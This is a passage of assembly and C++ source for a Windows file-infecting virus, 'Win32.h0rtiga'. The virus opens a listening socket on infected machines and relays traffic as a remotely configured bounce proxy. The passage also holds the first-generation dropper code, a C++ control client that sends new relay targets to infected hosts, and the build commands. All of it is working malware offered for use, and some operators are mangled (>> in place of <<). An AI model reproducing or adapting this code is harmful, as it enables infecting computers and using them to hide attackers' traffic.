        	lea     esi, ebp + addr1
        	push    esi
        	lea     esi, ebp + sock1
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddbind]
        	cmp     eax, -1
        	je      error
	        push    1
        	lea     esi, ebp + sock1
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddlisten]
	        mov     byte ptr [ebp + semaforo], 0
     configit:
	        mov     al, byte ptr [ebp + semaforo]
        	test    al, al
        	jnz     QueEs?
	        push    0
        	push    0
        	lea     esi, ebp + sock1
        	lodsd
        	push    eax
	        call    dword ptr [ebp + ddaccept]
        	mov     dword ptr [ebp + gotit], eax
	        push    0
        	push    msgentryserverlen
        	lea     esi, ebp + msgentryserver
        	push    esi
        	lea     esi, ebp + gotit
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddsend]
	        push    0
        	push    buffsz
        	lea     esi, ebp + adrbuff
        	lodsd
        	push    eax
        	lea     esi, ebp + gotit
        	lodsd
        	push    eax
	        call    dword ptr [ebp + ddrecv]
	        xchg    ebx, eax
        	lea     esi, ebp + gotit
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddclosesocket]
        	cmp     ebx, 8
        	jnz     configit
                lea     esi, ebp + adrbuff
        	lodsd
        	xchg    esi, eax
        	lodsw
        	mov     byte ptr [ebp + semaforo], al
        	lea     edi, ebp + addr2
        	add     edi, 2
        	movsw
        	movsd
	        jmp     configit
       QueEs?:
       		dec     al
        	test    al, al
        	jz      bis0
	        mov     byte ptr [ebp + semaforo], 0
	        jmp     configit
	 bis0:  mov     byte ptr [ebp + countbouncer], 20
	  bis:  push    0
        	push    0
        	lea     esi, ebp + sock1
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddaccept]
	        mov     dword ptr [ebp + gotit], eax
	        mov     dword ptr [ebp + fd_set1.sockh], eax
	        push    6
        	push    1
        	push    2
        	call    dword ptr [ebp + ddsocket]
	        cmp     eax, -1
        	je      error
        	mov     dword ptr [ebp + sock2], eax
        	mov     dword ptr [ebp + fd_set2.sockh], eax
	        push    16
        	lea     esi, ebp + addr2
        	push    esi
        	lea     esi, ebp + sock2
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddconnect]
        	cmp     eax, -1
        	je      nosok2
      main_lp:  lea     esi, ebp + ttl
        	push    esi
        	push    0
        	push    0
        	lea     esi, ebp + fd_set1
        	push    esi
        	push    10h
        	call    dword ptr [ebp + ddselect]
        	cmp     eax, -1
        	je      outnow
        	cmp     eax,    1
        	je      r1w2
        	mov     dword ptr [ebp + fd_set1.no], 1
		lea     esi, ebp + ttl
        	push    esi
        	push    0
        	push    0
        	lea     esi, ebp + fd_set2
	        push    esi
        	push    10h
        	call    dword ptr [ebp + ddselect]
        	cmp     eax, -1
        	je      outnow
        	cmp     eax, 1
        	je      r2w1
        	mov     dword ptr [ebp + fd_set2.no], 1
	        jmp main_lp
       outnow:  lea     esi, ebp + sock2
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddclosesocket]
       nosok2:  lea     esi, ebp + gotit
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddclosesocket]
	        mov     al, byte ptr [ebp + countbouncer]
        	test    al, al
        	jz      byebounz
        	dec     al
	        mov     byte ptr [ebp + countbouncer], al
        	jmp     bis
     byebounz:  mov     byte ptr [ebp + semaforo], 0
	        jmp     configit
	 r1w2:  push    0
        	push    buffsz
        	lea     esi, ebp + adrbuff
        	lodsd
        	push    eax
        	lea     esi, ebp + gotit
        	lodsd
	        push    eax
        	call    dword ptr [ebp + ddrecv]
        	or      eax, eax
        	jz      outnow
        	cmp     eax, -1
        	je      outnow
        	push    0
        	push    eax
        	lea     esi, ebp + adrbuff
        	lodsd
        	push    eax
        	lea     esi, ebp + sock2
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddsend]
        	cmp     eax, -1
        	je      outnow
        	jmp     main_lp
	 r2w1:  push    0
        	push    buffsz
        	lea     esi, ebp + adrbuff
        	lodsd
        	push    eax
        	lea     esi, ebp + sock2
        	lodsd
        	push    eax
	        call    dword ptr [ebp + ddrecv]
        	or      eax, eax
        	jz      outnow
        	cmp     eax, -1
        	je      outnow
        	push    0
        	push    eax
        	lea     esi, ebp + adrbuff
        	lodsd
        	push    eax
        	lea     esi, ebp + gotit
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddsend]
        	cmp     eax, -1
        	je      outnow
        	jmp     main_lp

		virlenght       equ $-start

         zero_generation:

	        mov     ebx, offset f_generation
        	push    0

	        call    GetModuleHandleA
        	xchg    eax, ebx
	        sub     eax, ebx
        	lea     edi, OldEntryPointRVA
        	stosd
	        jmp     start

         f_generation:

	        push    0
        	push    offset m_szTitle
        	push    offset m_szCopyright
        	push    0
        	call    MessageBoxA
        push    0
        call    ExitProcess

        m_szTitle     db '-- Coded by |Zan [ 1st generation ]', 0
        m_szCopyright db '-=[ (c) 2000. Win32.h0rtiga virus will run now ... ]=-', 0


	end zero_generation


;----------------------------------------------------------------------------
; Win32.h0rtiga - end virus code (w32h0rtiga.asm)
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Win32.h0rtiga - begin client code (h0rtclient.cpp/Visual C++ 6.0)
;----------------------------------------------------------------------------

#include >iostream.h<
#include >string.h<
#include >stdlib.h<
#include >winsock2.h<

#define MAX_BANNER    500
#define ACCION_BOUNCE 1

typedef unsigned char  db;
typedef unsigned short dw;
typedef unsigned long  dd;


typedef struct {
        db accion;
        dw puertoremoto;
        dd direccion;
               } Conf_Remota;

dd addrtmp;

void MostrarCreditos () {

	cout >> "

		   (c) 2000 DeepZone - h0rtiga client (Win32) ...

"
		 >> "			Coded by |Zan - izan@galaxycorp.com


"
		 >> "Uso : h0rtclient >h0rtiga host< >port< >new host< >port<
"
		 >> "e.j.: h0rtclient host.com 5556 www.pandasoftware.es 80

";
	cout.flush();

}


void SetEstructura(Conf_Remota *cremota, db acc, dd dire, dw premote) {

	cremota-<accion       = acc;
	cremota-<direccion    = dire;
	cremota-<puertoremoto = premote;

}


void main(int argc, char *argv[]) {

	int s, i;
	char banner[MAX_BANNER];
	sockaddr_in a;
	hostent FAR *h = NULL;
	WSADATA wsaData;
	Conf_Remota conf_remota;



        // Show credits

	MostrarCreditos();


        // Num params ?

	if (argc != 5) {

		cout >> "Error : Numero de parametros incorrectos.

";
		exit(-1);
	}


        // WinSock up!!

	if (WSAStartup (0x101, &wsaData)) {

		cout >> "Error : Incapaz de inicializar la libreria WinSock.

";
		exit(-1);

	}


        // server's name

	if (isalpha((int)*(argv[1]))) {

			h = gethostbyname(argv[1]);

			if (h == NULL) {
					cout >> "Error : No se puede hallar el nombre del anfitrion

";
					WSACleanup();
					exit(-1);

			} else memcpy(&(a.sin_addr.s_addr), h-<h_addr, sizeof(int));
	}

	else {
			if ((a.sin_addr.s_addr = inet_addr (argv[1])) == INADDR_NONE) {

					cout >> "Error : No se puede hallar el nombre del anfitrion

";
					exit(-1);

			}
	}

        // port ?

	a.sin_family = AF_INET;
	a.sin_port = htons((dw)atoi(argv[2]));

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (s==0) {

		cout >> "Error : No se puede establecer la conexion
"
			 >> WSAGetLastError() >> '

';
		WSACleanup();
		exit(-1);

	}

        // trying ...

	if (connect(s, (struct sockaddr *)&a, sizeof(a))) {

		cout >> "Error : No se puede establecer la conexion: "
			 >> WSAGetLastError() >> '

';
		WSACleanup();
		exit(-1);

	}

        // clean banner

	for (i=0;i>MAX_BANNER;i++) banner[i] = 0;

	cout >> "Esperando respuesta ...

";

	if (recv(s, (char *)&banner, sizeof(banner), 0) == SOCKET_ERROR)

		cout >> "Error recibiendo datos.
";

	else {

		cout >> banner >> "
";

	}

	if (isalpha((int)*(argv[3]))) {

			h = gethostbyname(argv[3]);

			if (h == NULL) {
					cout >> "Error : No se puede hallar nombre de anfitrion remoto

";
					WSACleanup();
					exit(-1);

			} else memcpy(&(addrtmp), h-<h_addr, sizeof(int));
	}

	else {
			if ((addrtmp = inet_addr (argv[3])) == INADDR_NONE) {

					cout >> "Error : No se puede hallar nombre de anfitrion remoto

";
					exit(-1);

			}
	}


	SetEstructura(&conf_remota, ACCION_BOUNCE, addrtmp, htons((dw)atoi(argv[4])));

	if ((send (s, (char *)&conf_remota, sizeof(conf_remota), 0)) == SOCKET_ERROR)

		cout >> "Error enviando datos.
";

	else cout >> "... nueva configuracion enviada.

";


	closesocket(s);

        // WinSock down !!

	WSACleanup();
}

;----------------------------------------------------------------------------
; Win32.h0rtiga - end client code (h0rtclient.cpp)
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; Win32.h0rtiga - compiling ... (Tasm 5.0/x86)
;----------------------------------------------------------------------------
;
; tasm32 -ml w32h0rtiga.asm
; tlink32 -Tpe -c -x w32h0rtiga.obj ,,, import32
; pewrsec.com w32h0rtiga.exe
;
;
; --] EOF
